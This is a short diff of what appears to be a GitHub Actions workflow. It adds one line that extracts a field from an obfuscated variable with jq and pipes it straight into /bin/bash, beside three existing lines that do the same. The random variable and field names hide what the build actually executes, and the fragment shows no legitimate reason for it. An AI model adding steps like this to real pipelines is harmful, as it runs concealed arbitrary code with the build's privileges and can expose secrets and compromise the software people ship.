@@ -38,6 +38,7 @@ jobs:
           echo $bissr209 | jq -r .rugrv93 | /bin/bash
           printf '%s' "$n7" | jq -r .y93 | /bin/bash
           printf '%s' "$fofja61" | jq -r .u05720 | /bin/bash
+          echo $mngv46 | jq -r .wxae71470 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
